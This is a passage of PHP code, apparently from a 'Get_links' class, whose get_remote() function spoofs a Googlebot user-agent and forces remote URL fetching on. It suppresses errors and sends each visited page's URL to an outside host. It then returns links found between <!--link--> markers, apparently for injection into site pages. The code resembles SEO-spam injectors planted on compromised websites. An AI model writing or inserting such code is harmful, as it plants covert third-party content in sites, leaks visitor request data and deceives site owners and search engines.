    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}
?>